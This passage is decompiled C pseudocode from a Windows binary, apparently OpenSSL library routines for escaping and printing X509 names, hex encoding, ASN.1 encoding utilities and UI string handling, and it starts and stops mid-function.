  }
  return result;
}

//----- (00444750) --------------------------------------------------------
BOOL __cdecl sub_444750(int a1, int a2, int a3)
{
  return !a1 || sub_405110(a1, a2, a3) == a3;
}

//----- (00444780) --------------------------------------------------------
int __usercall sub_444780@<eax>(
        _BYTE *a1@<edx>,
        unsigned __int8 a2@<bl>,
        int a3@<edi>,
        int (__cdecl *a4)(int, char *, int)@<esi>,
        unsigned int a5)
{
  __int16 v6; // cx
  char v7; // [esp+3h] [ebp-11h] BYREF
  char v8[12]; // [esp+4h] [ebp-10h] BYREF

  if ( a5 > 0xFFFF )
  {
    sub_4191B0((int)v8, 11, "\\W%08lX", a5);
    return a4(a3, v8, 10) != 0 ? 10 : -1;
  }
  if ( a5 > 0xFF )
  {
    sub_4191B0((int)v8, 11, "\\U%04lX", a5);
    return a4(a3, v8, 6) != 0 ? 6 : -1;
  }
  v7 = a5;
  if ( (unsigned __int8)a5 <= 0x7Fu )
    v6 = a2 & word_50CB28[(unsigned __int8)a5];
  else
    v6 = a2 & 4;
  if ( (v6 & 0x61) == 0 )
  {
    if ( (v6 & 0x406) != 0 )
    {
      sub_4191B0((int)v8, 11, "\\%02X", (unsigned __int8)a5);
      return a4(a3, v8, 3) != 0 ? 3 : -1;
    }
    if ( (_BYTE)a5 == 92 && (a2 & 0xF) != 0 )
      return a4(a3, (char *)&word_50CC5C, 2) != 0 ? 2 : -1;
    return a4(a3, &v7, 1) != 0 ? 1 : -1;
  }
  if ( (v6 & 8) != 0 )
  {
    if ( a1 )
      *a1 = 1;
    return a4(a3, &v7, 1) != 0 ? 1 : -1;
  }
  if ( a4(a3, (char *)word_52F7B8, 1) )
    return a4(a3, &v7, 1) != 0 ? 2 : -1;
  else
    return -1;
}
// 50CB28: using guessed type __int16 word_50CB28[128];
// 50CC5C: using guessed type __int16 word_50CC5C;

//----- (00444940) --------------------------------------------------------
int __fastcall sub_444940(_BYTE *a1, int (__cdecl *a2)(int, char *, int), int a3, int a4, char a5, char a6, int a7)
{
  int v7; // eax
  int v8; // esi
  unsigned __int8 *v9; // ebx
  int v10; // ebp
  int v11; // ecx
  unsigned __int8 *v12; // ebx
  int v13; // edx
  int v14; // eax
  int v15; // eax
  int v16; // ebp
  unsigned __int8 v17; // bl
  int v18; // eax
  int v19; // eax
  int v21; // [esp+10h] [ebp-38h] BYREF
  unsigned __int8 *v22; // [esp+14h] [ebp-34h]
  int v23; // [esp+18h] [ebp-30h]
  int v24; // [esp+1Ch] [ebp-2Ch]
  _BYTE *v25; // [esp+20h] [ebp-28h]
  int v26; // [esp+24h] [ebp-24h]
  int (__cdecl *v27)(int, char *, int); // [esp+28h] [ebp-20h]
  unsigned __int8 *v28; // [esp+2Ch] [ebp-1Ch]
  int v29; // [esp+30h] [ebp-18h]
  int v30; // [esp+34h] [ebp-14h]
  int v31; // [esp+38h] [ebp-10h]
  char v32[8]; // [esp+3Ch] [ebp-Ch] BYREF

  v7 = a4;
  v8 = a3;
  v25 = a1;
  v26 = a3;
  v29 = a4;
  v27 = a2;
  v9 = (unsigned __int8 *)a3;
  v28 = (unsigned __int8 *)(a4 + a3);
  v23 = 0;
  if ( a3 == a4 + a3 )
    return v23;
  v10 = a5 & 7;
  v31 = v10;
  while ( 2 )
  {
    if ( v9 != (unsigned __int8 *)v8 || (v24 = 32, (a6 & 1) == 0) )
      v24 = 0;
    switch ( v10 )
    {
      case 0:
        v15 = sub_4719F0((char *)v9, v7, &v21);
        if ( v15 < 0 )
          return -1;
        v9 += v15;
        v14 = v21;
        goto LABEL_13;
      case 1:
        v14 = *v9;
        v21 = v14;
        ++v9;
        goto LABEL_13;
      case 2:
        v21 = *v9 << 8;
        v14 = v9[1] | v21;
        v21 = v14;
        v9 += 2;
        goto LABEL_13;
      case 4:
        v21 = *v9 << 24;
        v11 = v9[1];
        v12 = v9 + 1;
        v21 |= v11 << 16;
        v13 = *++v12;
        v21 |= v13 << 8;
        v14 = v12[1] | v21;
        v21 = v14;
        v9 = v12 + 2;
LABEL_13:
        v22 = v9;
        if ( v9 == v28 && (a6 & 1) != 0 )
          v24 = 64;
        if ( (a5 & 8) == 0 )
        {
          v19 = sub_444780(v25, v24 | a6, a7, v27, v14);
          if ( v19 < 0 )
            return -1;
          v23 += v19;
LABEL_24:
          v9 = v22;
          v8 = v26;
LABEL_25:
          if ( v9 == v28 )
            return v23;
          v7 = v29;
          v10 = v31;
          continue;
        }
        v16 = 0;
        v30 = sub_471CA0(v32, 6, v14);
        if ( v30 <= 0 )
          goto LABEL_25;
        v17 = v24 | a6;
        while ( 1 )
        {
          v18 = sub_444780(v25, v17, a7, v27, (unsigned __int8)v32[v16]);
          if ( v18 < 0 )
            return -1;
          v23 += v18;
          if ( ++v16 >= v30 )
            goto LABEL_24;
        }
      default:
        return -1;
    }
  }
}
// 444940: using guessed type char var_C[8];

//----- (00444B30) --------------------------------------------------------
int __usercall sub_444B30@<eax>(_BYTE *a1@<ecx>, int a2@<edi>, int (__cdecl *a3)(int, char *, int), int a4)
{
  _BYTE *v4; // esi
  _BYTE *v5; // ebx
  char v6; // al
  char v8[4]; // [esp+Ch] [ebp-4h] BYREF

  v4 = a1;
  if ( !a2 )
    return 2 * a4;
  v5 = &a1[a4];
  if ( a1 == &a1[a4] )
    return 2 * a4;
  while ( 1 )
  {
    v6 = byte_50CC28[*v4 & 0xF];
    v8[0] = byte_50CC28[(unsigned __int8)*v4 >> 4];
    v8[1] = v6;
    if ( !a3(a2, v8, 2) )
      break;
    if ( ++v4 == v5 )
      return 2 * a4;
  }
  return -1;
}

//----- (00444BA0) --------------------------------------------------------
int __fastcall sub_444BA0(int a1, int a2, __int16 a3, int (__cdecl *a4)(int, char *, int))
{
  int (__cdecl *v4)(int, char *, int); // ebp
  int v8; // eax
  signed int v9; // ebx
  int (__cdecl *v10)(int, char *, int); // esi
  int v11; // edi
  int v12[2]; // [esp+Ch] [ebp-8h] BYREF

  v4 = a4;
  if ( !a4(a2, "#", 1) )
    return -1;
  if ( (a3 & 0x200) != 0 )
  {
    v12[0] = *(_DWORD *)(a1 + 4);
    v12[1] = a1;
    v9 = sub_42C5E0((int)v12, 0);
    v10 = (int (__cdecl *)(int, char *, int))sub_4133F0(v9);
    if ( v10
      && (a4 = v10, sub_42C5E0((int)v12, (void **)&a4), v11 = sub_444B30(v10, a2, v4, v9), sub_413490(v10), v11 >= 0) )
    {
      return v11 + 1;
    }
    else
    {
      return -1;
    }
  }
  else
  {
    v8 = sub_444B30(*(_BYTE **)(a1 + 8), a2, v4, *(_DWORD *)a1);
    if ( v8 < 0 )
      return -1;
    return v8 + 1;
  }
}

//----- (00444C80) --------------------------------------------------------
int __usercall sub_444C80@<eax>(__int16 a1@<cx>, int (__cdecl *a2)(int, char *, int)@<edi>, int a3, int *a4)
{
  unsigned int v4; // eax
  char v6; // bp
  const char *v7; // eax
  unsigned int v8; // esi
  int v9; // esi
  int v10; // eax
  int v12; // eax
  int v13; // eax
  char v14; // [esp+Fh] [ebp-9h] BYREF
  unsigned int v15; // [esp+10h] [ebp-8h]
  unsigned int v16; // [esp+14h] [ebp-4h]

  v4 = a4[1];
  v6 = a1 & 0xF;
  v14 = 0;
  v16 = v4;
  v15 = 0;
  if ( (a1 & 0x40) != 0 )
  {
    v7 = sub_454FB0(v4);
    v8 = strlen(v7);
    if ( !a2(a3, (char *)v7, v8) || !a2(a3, (char *)word_4F1980, 1) )
      return -1;
    v4 = v16;
    v15 = v8 + 1;
  }
  if ( (a1 & 0x80u) != 0 )
    goto LABEL_10;
  if ( (a1 & 0x20) != 0 )
    goto LABEL_13;
  if ( v4 - 1 > 0x1D || (v9 = byte_50CC3C[v4], v9 == -1) )
  {
    if ( (a1 & 0x100) != 0 )
    {
LABEL_10:
      v10 = sub_444BA0((int)a4, a3, a1, a2);
      if ( v10 >= 0 )
        return v15 + v10;
      return -1;
    }
LABEL_13:
    v9 = 1;
  }
  if ( (a1 & 0x10) != 0 )
  {
    if ( v9 )
      LOBYTE(v9) = v9 | 8;
    else
      LOBYTE(v9) = 1;
  }
  v12 = sub_444940(&v14, a2, a4[2], *a4, v9, v6, 0);
  if ( v12 < 0 )
    return -1;
  v15 += v12;
  if ( v14 )
    v15 += 2;
  v13 = a3;
  if ( !a3 )
    return v15;
  if ( v14 )
  {
    if ( !a2(a3, "\"", 1) )
      return -1;
    v13 = a3;
  }
  if ( sub_444940(0, a2, a4[2], *a4, v9, v6, v13) < 0 || v14 && !a2(a3, "\"", 1) )
    return -1;
  return v15;
}

//----- (00444E10) --------------------------------------------------------
int __usercall sub_444E10@<eax>(int a1@<ebx>, int a2@<edi>, int (__cdecl *a3)(int, const char *, int))
{
  int v3; // esi

  v3 = 0;
  if ( a2 <= 0 )
    return 1;
  while ( a3(a1, " ", 1) )
  {
    if ( ++v3 >= a2 )
      return 1;
  }
  return 0;
}

//----- (00444E50) --------------------------------------------------------
int __cdecl sub_444E50(int (__cdecl *a1)(int, const char *, int), int *a2, int a3, int a4)
{
  int v4; // ecx
  int **v5; // ebp
  int v6; // edi
  int v8; // eax
  void *v9; // ebx
  int v10; // eax
  int v11; // ecx
  int v12; // eax
  int v13; // esi
  int v14; // edi
  int v15; // eax
  int v16; // ebp
  int v17; // edi
  char *v18; // eax
  signed int v19; // esi
  int (__cdecl *v20)(int, char *, int); // ebx
  int v21; // edi
  __int16 v22; // cx
  int v23; // eax
  int v24; // [esp+Ch] [ebp-98h]
  int v25; // [esp+10h] [ebp-94h]
  int v26; // [esp+18h] [ebp-8Ch]
  int v27; // [esp+1Ch] [ebp-88h]
  const char *v28; // [esp+20h] [ebp-84h]
  const char *v29; // [esp+24h] [ebp-80h]
  int v30; // [esp+28h] [ebp-7Ch]
  int v31; // [esp+2Ch] [ebp-78h]
  const char *v32; // [esp+30h] [ebp-74h]
  int v33; // [esp+34h] [ebp-70h]
  int v34; // [esp+38h] [ebp-6Ch]
  int *v35; // [esp+44h] [ebp-60h]
  int v36; // [esp+48h] [ebp-5Ch]
  char v37[80]; // [esp+50h] [ebp-54h] BYREF

  v5 = (int **)a2;
  v6 = a3;
  v25 = v4;
  v34 = -1;
  if ( a3 < 0 )
  {
    a3 = 0;
    v6 = 0;
  }
  v24 = v6;
  if ( !sub_444E10(v4, v6, a1) )
    return -1;
  v8 = a4 & 0xF0000;
  if ( (a4 & 0xF0000u) > 0x30000 )
  {
    if ( v8 == 0x40000 )
    {
      v29 = "\n";
      v26 = 1;
      goto LABEL_14;
    }
    return -1;
  }
  if ( (a4 & 0xF0000) == 196608 )
  {
    v29 = "; ";
    v26 = 2;
    a3 = 0;
    goto LABEL_14;
  }
  if ( v8 != 0x10000 )
  {
    if ( v8 == 0x20000 )
    {
      v29 = ", ";
      v26 = 2;
      a3 = 0;
LABEL_14:
      v28 = " + ";
      v27 = 3;
      goto LABEL_15;
    }
    return -1;
  }
  v29 = ",";
  v26 = 1;
  v28 = "+";
  v27 = 1;
  a3 = 0;
LABEL_15:
  if ( (a4 & 0x800000) != 0 )
  {
    v32 = " = ";
    v33 = 3;
  }
  else
  {
    v32 = "=";
    v33 = 1;
  }
  v9 = (void *)((unsigned int)&unk_600000 & a4);
  v10 = sub_44EDF0(a2);
  v36 = v10;
  v31 = 0;
  if ( v10 > 0 )
  {
    v11 = a4 & 0x100000;
    v30 = v10 - 1;
    while ( 1 )
    {
      if ( v11 )
        v12 = sub_44EE70(v5, v30);
      else
        v12 = sub_44EE70(v5, v31);
      v13 = v12;
      if ( v34 != -1 )
      {
        if ( v34 == sub_432B60(v12) )
        {
          if ( !a1(v25, v28, v27) )
            return -1;
          v24 += v27;
        }
        else
        {
          if ( !a1(v25, v29, v26) || !sub_444E10(v25, a3, a1) )
            return -1;
          v9 = (void *)((unsigned int)&unk_600000 & a4);
          v24 += a3 + v26;
        }
      }
      v34 = sub_432B60(v13);
      v14 = sub_445DB0(v13);
      v35 = (int *)sub_445DD0(v13);
      v15 = sub_423680(v14);
      v16 = v15;
      if ( v9 == &unk_600000 )
      {
        v20 = (int (__cdecl *)(int, char *, int))a1;
        goto LABEL_49;
      }
      if ( v9 == (void *)0x400000 || !v15 )
        break;
      if ( v9 )
      {
        if ( v9 != (void *)0x200000 )
        {
          v18 = (char *)&unk_4F1291;
LABEL_40:
          v17 = 0;
          goto LABEL_41;
        }
        v17 = 25;
        v18 = sub_423440(v15);
      }
      else
      {
        v17 = 10;
        v18 = sub_4233A0(v15);
      }
LABEL_41:
      v19 = strlen(v18);
      v20 = (int (__cdecl *)(int, char *, int))a1;
      if ( !a1(v25, v18, v19) )
        return -1;
      if ( v19 < v17 && (a4 & 0x2000000) != 0 )
      {
        v21 = v17 - v19;
        if ( !sub_444E10(v25, v21, a1) )
          return -1;
        v24 += v21;
        v20 = (int (__cdecl *)(int, char *, int))a1;
      }
      if ( !v20(v25, (char *)v32, v33) )
        return -1;
      v24 += v33 + v19;
LABEL_49:
      if ( v16 || (a4 & 0x1000000) == 0 )
        v22 = 0;
      else
        v22 = 128;
      v23 = sub_444C80(a4 | v22, v20, v25, v35);
      if ( v23 < 0 )
        return -1;
      v24 += v23;
      --v30;
      if ( ++v31 >= v36 )
        return v24;
      v5 = (int **)a2;
      v11 = a4 & 0x100000;
      v9 = (void *)((unsigned int)&unk_600000 & a4);
    }
    sub_423740(v37, 80, v14, 1);
    v18 = v37;
    goto LABEL_40;
  }
  return v24;
}
// 444E86: variable 'v4' is possibly undefined

//----- (00445220) --------------------------------------------------------
int __cdecl sub_445220(int a1, int *a2, int a3, int a4)
{
  if ( a4 )
    return sub_444E50((int (__cdecl *)(int, const char *, int))sub_444750, a2, a3, a4);
  else
    return sub_42CE10(a1, a2);
}

//----- (00445260) --------------------------------------------------------
int __cdecl sub_445260(_DWORD *a1, signed int *a2)
{
  unsigned int v2; // eax
  int v3; // eax
  int result; // eax
  char *v5; // [esp-10h] [ebp-24h]
  signed int v6; // [esp-Ch] [ebp-20h]
  int v7; // [esp+0h] [ebp-14h] BYREF
  int v8; // [esp+4h] [ebp-10h] BYREF
  int v9; // [esp+Ch] [ebp-8h]
  int v10; // [esp+10h] [ebp-4h]

  v7 = (int)&v8;
  if ( !a2 )
    return -1;
  v2 = a2[1];
  if ( v2 > 0x1E )
    return -1;
  v3 = byte_50CC3C[v2];
  if ( v3 == -1 )
    return -1;
  v6 = *a2;
  v5 = (char *)a2[2];
  v9 = 0;
  v8 = 0;
  v10 = 0;
  result = sub_4724F0(&v7, v5, v6, v3 | 0x1000, 0x2000);
  if ( result >= 0 )
  {
    *a1 = v9;
    return v8;
  }
  return result;
}

//----- (004452F0) --------------------------------------------------------
char *__cdecl sub_4452F0(int *a1, char *Destination, int a3)
{
  int **v3; // ebx
  char *v4; // esi
  _DWORD *v5; // edi
  _DWORD *v6; // eax
  _DWORD *v7; // ebp
  size_t v8; // ebp
  int *v9; // esi
  int v10; // eax
  char *v11; // eax
  size_t v12; // ebx
  int *v13; // eax
  int v14; // ebp
  int v15; // esi
  int v16; // edx
  int v17; // ecx
  int v18; // eax
  int i; // eax
  unsigned __int8 v20; // cl
  int v21; // edi
  size_t v22; // edx
  bool v23; // sf
  char *v24; // esi
  void *v25; // eax
  char *v26; // esi
  int v27; // ecx
  char *v28; // esi
  int v29; // edi
  _BYTE *v30; // esi
  int j; // ecx
  int v32; // eax
  _BYTE *v33; // esi
  int *v34; // ecx
  int v35; // esi
  int v37; // [esp-Ch] [ebp-9Ch]
  int v38; // [esp-4h] [ebp-94h]
  _DWORD *Block; // [esp+10h] [ebp-80h]
  char *v40; // [esp+14h] [ebp-7Ch]
  int v41; // [esp+18h] [ebp-78h]
  int v42; // [esp+1Ch] [ebp-74h]
  int v43; // [esp+20h] [ebp-70h]
  int v44; // [esp+24h] [ebp-6Ch]
  int v45; // [esp+28h] [ebp-68h]
  void *Src; // [esp+2Ch] [ebp-64h]
  int v47; // [esp+30h] [ebp-60h]
  int *v48; // [esp+34h] [ebp-5Ch]
  int *v49; // [esp+38h] [ebp-58h]
  char v50[80]; // [esp+3Ch] [ebp-54h] BYREF
  int v51; // [esp+9Ch] [ebp+Ch]

  v3 = (int **)a1;
  v4 = Destination;
  v5 = 0;
  v48 = a1;
  Block = 0;
  if ( Destination )
  {
    if ( a3 )
    {
      v8 = a3;
      goto LABEL_7;
    }
    return 0;
  }
  v6 = sub_4197E0();
  v7 = v6;
  Block = v6;
  if ( !v6 || !sub_4198C0((int)v6, 0xC8u) )
  {
LABEL_52:
    sub_408310(11, 116, 65, (int)"crypto\\x509\\x509_obj.c", 178);
LABEL_53:
    sub_419810(Block);
    return 0;
  }
  v5 = Block;
  *(_BYTE *)v7[1] = 0;
  v8 = 200;
LABEL_7:
  if ( a1 )
  {
    v47 = 0;
    v45 = 0;
    v51 = v8 - 1;
    if ( sub_426A30(*a1) > 0 )
    {
      while ( 1 )
      {
        v9 = (int *)sub_426A40(*v3, v45);
        v37 = *v9;
        v49 = v9;
        v10 = sub_423680(v37);
        if ( !v10 || (v11 = sub_4233A0(v10), (Src = v11) == 0) )
        {
          sub_4229E0(v50, 80, *v9);
          v11 = v50;
          Src = v50;
        }
        v12 = strlen(v11);
        v13 = (int *)v9[1];
        v14 = *v13;
        if ( *v13 > 0x100000 )
        {
          sub_408310(11, 116, 134, (int)"crypto\\x509\\x509_obj.c", 75);
          sub_419810(v5);
          return 0;
        }
        v15 = v13[2];
        if ( v13[1] != 27 || v14 % 4 )
        {
          v44 = 1;
          v43 = 1;
          v42 = 1;
          v41 = 1;
          v16 = 0;
        }
        else
        {
          v16 = 0;
          v17 = 0;
          v18 = 0;
          v43 = 0;
          v42 = 0;
          v41 = 0;
          if ( v14 > 0 )
          {
            do
            {
              if ( *(_BYTE *)(v18 + v15) )
                *(&v41 + (v18 & 3)) = 1;
              ++v18;
            }
            while ( v18 < v14 );
            v17 = v41;
          }
          if ( v43 | v42 | v17 )
          {
            v44 = 1;
            v43 = 1;
            v42 = 1;
            v41 = 1;
          }
          else
          {
            v43 = 0;
            v42 = 0;
            v41 = 0;
            v44 = 1;
          }
        }
        for ( i = 0; i < v14; ++i )
        {
          if ( *(&v41 + (i & 3)) )
          {
            v20 = *(_BYTE *)(i + v15);
            ++v16;
            if ( v20 < 0x20u || v20 > 0x7Eu )
              v16 += 3;
          }
        }
        v21 = v47;
        v22 = v12 + v16;
        v23 = (int)(v47 + v22 - 1048574) < 0;
        v47 += v22 + 2;
        if ( !(v23 ^ __OFSUB__(v47, 0x100000) | (v47 == 0x100000)) )
        {
          sub_408310(11, 116, 134, (int)"crypto\\x509\\x509_obj.c", 124);
          goto LABEL_53;
        }
        if ( Block )
        {
          if ( !sub_4198C0((int)Block, v47 + 1) )
            goto LABEL_52;
          v24 = (char *)(v21 + Block[1]);
        }
        else
        {
          if ( v47 > v51 )
          {
            v4 = Destination;
            goto LABEL_56;
          }
          v24 = &Destination[v21];
        }
        v25 = Src;
        *v24 = 47;
        v26 = v24 + 1;
        memcpy(v26, v25, v12);
        v27 = (int)v49;
        v28 = &v26[v12];
        *v28 = 61;
        v29 = *(_DWORD *)(*(_DWORD *)(v27 + 4) + 8);
        v30 = v28 + 1;
        for ( j = 0; j < v14; ++j )
        {
          if ( *(&v41 + (j & 3)) )
          {
            v32 = *(unsigned __int8 *)(j + v29);
            if ( (unsigned int)(v32 - 32) > 0x5E )
            {
              *v30 = 92;
              v33 = v30 + 1;
              *v33++ = 120;
              *v33 = byte_50CCAC[(v32 >> 4) & 0xF];
              v30 = v33 + 1;
              LOBYTE(v32) = byte_50CCAC[v32 & 0xF];
            }
            *v30++ = v32;
          }
        }
        v34 = v48;
        *v30 = 0;
        v38 = *v34;
        v35 = ++v45;
        v5 = Block;
        if ( v35 >= sub_426A30(v38) )
        {
          v4 = Destination;
          break;
        }
        v3 = (int **)v48;
      }
    }
    if ( v5 )
    {
      v4 = (char *)v5[1];
      sub_413490(v5);
    }
LABEL_56:
    if ( !v45 )
      *v4 = 0;
  }
  else
  {
    if ( v5 )
    {
      v40 = (char *)v5[1];
      sub_413490(v5);
      v4 = v40;
    }
    strncpy(v4, "NO X509_NAME", v8);
    v4[v8 - 1] = 0;
  }
  return v4;
}

//----- (004456B0) --------------------------------------------------------
int __cdecl sub_4456B0(_DWORD *a1, int a2)
{
  return *(_DWORD *)(*(_DWORD *)(a2 + 4) + *a1);
}

//----- (004456D0) --------------------------------------------------------
int __cdecl sub_4456D0(_DWORD *a1, int a2, int a3)
{
  int *v3; // ecx
  int result; // eax

  v3 = (int *)(*a1 + *(_DWORD *)(a3 + 4));
  result = *v3;
  *v3 = a2;
  return result;
}

//----- (004456F0) --------------------------------------------------------
int __cdecl sub_4456F0(_DWORD *a1, LONG Value, int a3)
{
  int v4; // ecx
  volatile LONG *v5; // eax
  LPCRITICAL_SECTION *v6; // esi
  struct _RTL_CRITICAL_SECTION *v7; // eax

  if ( *(_BYTE *)a3 != 1 && *(_BYTE *)a3 != 6 )
    return 0;
  v4 = *(_DWORD *)(a3 + 16);
  if ( !v4 || (*(_BYTE *)(v4 + 4) & 1) == 0 )
    return 0;
  v5 = (volatile LONG *)(*a1 + *(_DWORD *)(v4 + 8));
  v6 = (LPCRITICAL_SECTION *)(*a1 + *(_DWORD *)(v4 + 12));
  if ( Value )
  {
    if ( sub_4147E0(v5, Value, &a3) < 0 )
      return -1;
    if ( !a3 )
    {
      sub_4146D0(*v6);
      *v6 = 0;
    }
    return a3;
  }
  else
  {
    *v5 = 1;
    v7 = sub_414650();
    *v6 = v7;
    if ( !v7 )
    {
      sub_408310(13, 233, 65, (int)"crypto\\asn1\\tasn_utl.c", 74);
      return -1;
    }
    return 1;
  }
}

//----- (00445790) --------------------------------------------------------
_DWORD *__cdecl sub_445790(_DWORD *a1, int a2)
{
  _DWORD *result; // eax

  result = a1;
  if ( a1 )
  {
    if ( *a1 )
    {
      result = *(_DWORD **)(a2 + 16);
      if ( result )
      {
        if ( (result[1] & 2) != 0 )
        {
          result = (_DWORD *)(*a1 + result[5]);
          if ( result )
          {
            *result = 0;
            result[1] = 0;
            result[2] = 1;
          }
        }
      }
    }
  }
  return result;
}

//----- (004457D0) --------------------------------------------------------
void __cdecl sub_4457D0(_DWORD *a1, int a2)
{
  int v2; // eax
  int v3; // esi

  if ( a1 )
  {
    if ( *a1 )
    {
      v2 = *(_DWORD *)(a2 + 16);
      if ( v2 )
      {
        if ( (*(_BYTE *)(v2 + 4) & 2) != 0 )
        {
          v3 = *a1 + *(_DWORD *)(v2 + 20);
          if ( v3 )
          {
            sub_413490(*(void **)v3);
            *(_DWORD *)v3 = 0;
            *(_DWORD *)(v3 + 4) = 0;
            *(_DWORD *)(v3 + 8) = 1;
          }
        }
      }
    }
  }
}

//----- (00445820) --------------------------------------------------------
int __cdecl sub_445820(_DWORD *a1, void *Src, size_t Size, int a4)
{
  int v4; // eax
  int v5; // esi
  int result; // eax

  if ( !a1 )
    return 1;
  if ( !*a1 )
    return 1;
  v4 = *(_DWORD *)(a4 + 16);
  if ( !v4 )
    return 1;
  if ( (*(_BYTE *)(v4 + 4) & 2) == 0 )
    return 1;
  v5 = *a1 + *(_DWORD *)(v4 + 20);
  if ( !v5 )
    return 1;
  sub_413490(*(void **)v5);
  result = (int)sub_4133F0(Size);
  *(_DWORD *)v5 = result;
  if ( result )
  {
    memcpy((void *)result, Src, Size);
    *(_DWORD *)(v5 + 4) = Size;
    *(_DWORD *)(v5 + 8) = 0;
    return 1;
  }
  return result;
}

//----- (004458B0) --------------------------------------------------------
int __cdecl sub_4458B0(_DWORD *a1, void **a2, _DWORD *a3, int a4)
{
  int v4; // eax
  int v5; // esi

  if ( !a3 )
    return 0;
  if ( !*a3 )
    return 0;
  v4 = *(_DWORD *)(a4 + 16);
  if ( !v4 )
    return 0;
  if ( (*(_BYTE *)(v4 + 4) & 2) == 0 )
    return 0;
  v5 = *a3 + *(_DWORD *)(v4 + 20);
  if ( !v5 || *(_DWORD *)(v5 + 8) )
    return 0;
  if ( a2 )
  {
    memcpy(*a2, *(const void **)v5, *(_DWORD *)(v5 + 4));
    *a2 = (char *)*a2 + *(_DWORD *)(v5 + 4);
  }
  if ( a1 )
    *a1 = *(_DWORD *)(v5 + 4);
  return 1;
}

//----- (00445920) --------------------------------------------------------
int __cdecl sub_445920(_DWORD *a1, int a2)
{
  return *a1 + *(_DWORD *)(a2 + 8);
}

//----- (00445930) --------------------------------------------------------
_DWORD *__cdecl sub_445930(_DWORD *a1, int a2, int a3)
{
  _DWORD *v3; // edi
  _DWORD *result; // eax
  _DWORD *v5; // esi
  unsigned int *v6; // eax
  int v7; // eax
  int (__cdecl *v8)(int *); // ecx
  int v9; // edi
  _DWORD *v10; // edx
  int v11; // ecx

  v3 = (_DWORD *)a2;
  if ( (*(_DWORD *)a2 & 0x300) == 0 )
    return (_DWORD *)a2;
  v5 = (_DWORD *)(*(int (**)(void))(a2 + 16))();
  v6 = *(unsigned int **)(*a1 + v5[1]);
  if ( !v6 )
  {
    result = (_DWORD *)v5[6];
    if ( result )
      return result;
LABEL_17:
    if ( a3 )
      sub_408310(13, 110, 164, (int)"crypto\\asn1\\tasn_utl.c", 238);
    return 0;
  }
  if ( (*v3 & 0x100) != 0 )
    v7 = sub_423680((int)v6);
  else
    v7 = sub_431860(v6);
  a2 = v7;
  v8 = (int (__cdecl *)(int *))v5[2];
  if ( v8 )
  {
    if ( !v8(&a2) )
    {
      sub_408310(13, 110, 164, (int)"crypto\\asn1\\tasn_utl.c", 213);
      return 0;
    }
    v7 = a2;
  }
  v9 = v5[4];
  v10 = (_DWORD *)v5[3];
  v11 = 0;
  if ( v9 <= 0 )
  {
LABEL_16:
    result = (_DWORD *)v5[5];
    if ( result )
      return result;
    goto LABEL_17;
  }
  while ( *v10 != v7 )
  {
    ++v11;
    v10 += 6;
    if ( v11 >= v9 )
      goto LABEL_16;
  }
  return v10 + 1;
}

//----- (004459F0) --------------------------------------------------------
void __cdecl sub_4459F0(void **Block)
{
  if ( ((_BYTE)Block[7] & 1) != 0 )
  {
    sub_413490(Block[1]);
    if ( *Block == (void *)3 )
    {
      sub_413490(Block[4]);
      sub_413490(Block[5]);
      sub_413490(Block[6]);
    }
  }
  sub_413490(Block);
}

//----- (00445A60) --------------------------------------------------------
void __cdecl sub_445A60(void *Block)
{
  if ( Block )
  {
    sub_426C00(*((void **)Block + 1), (void (__cdecl *)(_DWORD))sub_4459F0);
    sub_414DC0(0xBu, (int)Block, (int **)Block + 3);
    sub_4146D0(*((LPCRITICAL_SECTION *)Block + 5));
    sub_413490(Block);
  }
}

//----- (00445AA0) --------------------------------------------------------
_DWORD *__usercall sub_445AA0@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>, int a4, int a5)
{
  _DWORD *result; // eax

  if ( a3 )
  {
    if ( (a2 == 1 || a2 == 2 || a2 == 3) && !a1 )
    {
      sub_408310(40, 109, 105, (int)"crypto\\ui\\ui_lib.c", 102);
      return 0;
    }
    else
    {
      result = sub_4133F0(0x20u);
      if ( result )
      {
        result[1] = a3;
        result[2] = a5;
        *result = a2;
        result[3] = a1;
        result[7] = a4 != 0;
      }
    }
  }
  else
  {
    sub_408310(40, 109, 67, (int)"crypto\\ui\\ui_lib.c", 99);
    return 0;
  }
  return result;
}

//----- (00445B20) --------------------------------------------------------
int __usercall sub_445B20@<eax>(
        int a1@<edx>,
        int a2@<ecx>,
        int a3@<ebx>,
        int a4,
        int a5,
        int a6,
        void *a7,
        void *a8,
        void *a9)
{
  void **v9; // esi
  _DWORD *v10; // eax
  int result; // eax
  int v12; // edi

  v9 = (void **)sub_445AA0(a3, a1, a5, a2, a6);
  if ( !v9 )
    return -1;
  if ( !*(_DWORD *)(a4 + 4) )
  {
    v10 = sub_426AF0();
    *(_DWORD *)(a4 + 4) = v10;
    if ( !v10 )
    {
      sub_4459F0(v9);
      return -1;
    }
  }
  v9[4] = a7;
  v9[5] = a8;
  v9[6] = a9;
  result = sub_4269B0(*(int **)(a4 + 4), (int)v9);
  if ( result <= 0 )
  {
    v12 = result - 1;
    sub_4459F0(v9);
    return v12;
  }
  return result;
}

//----- (00445BA0) --------------------------------------------------------
int __cdecl sub_445BA0(int a1, int a2, int a3, int a4, void *a5, void *a6)
{
  return sub_445B20(1, 0, a4, a1, a2, a3, a5, a6, 0);
}

//----- (00445BE0) --------------------------------------------------------
int __cdecl sub_445BE0(int a1, int a2, int a3, int a4, void *a5, void *a6, void *a7)
{
  return sub_445B20(2, 0, a4, a1, a2, a3, a5, a6, a7);
}

//----- (00445C20) --------------------------------------------------------
int __cdecl sub_445C20(int a1, int a2, int *a3)
{
  int v3; // edx
  int (__cdecl *v4)(int *, int *); // eax
  int v6[8]; // [esp+0h] [ebp-20h] BYREF

  v3 = *a3;
  memset(&v6[2], 0, 24);
  v6[0] = 5;
  v6[1] = a1;
  v4 = *(int (__cdecl **)(int *, int *))(v3 + 8);
  if ( !v4 || v4(a3, v6) )
    return 0;
  else
    return -1;
}

//----- (00445C90) --------------------------------------------------------
int __cdecl sub_445C90(int a1)
{
  int (__cdecl *v1)(int); // eax
  int v2; // ebx
  int v4; // edi
  int v5; // eax
  int (__cdecl *v6)(int); // eax
  int v7; // eax
  int i; // edi
  int v9; // eax
  int v10; // eax
  int (__cdecl *v11)(int); // eax

  v1 = *(int (__cdecl **)(int))(*(_DWORD *)a1 + 4);
  v2 = 0;
  if ( v1 && !v1(a1) )
    return -1;
  if ( (*(_DWORD *)(a1 + 16) & 0x100) != 0 )
    sub_406660((int (__cdecl *)(char *, unsigned int, int))sub_445C20, a1);
  v4 = 0;
  if ( sub_426A30(*(_DWORD *)(a1 + 4)) > 0 )
  {
    while ( 1 )
    {
      if ( *(_DWORD *)(*(_DWORD *)a1 + 8) )
      {
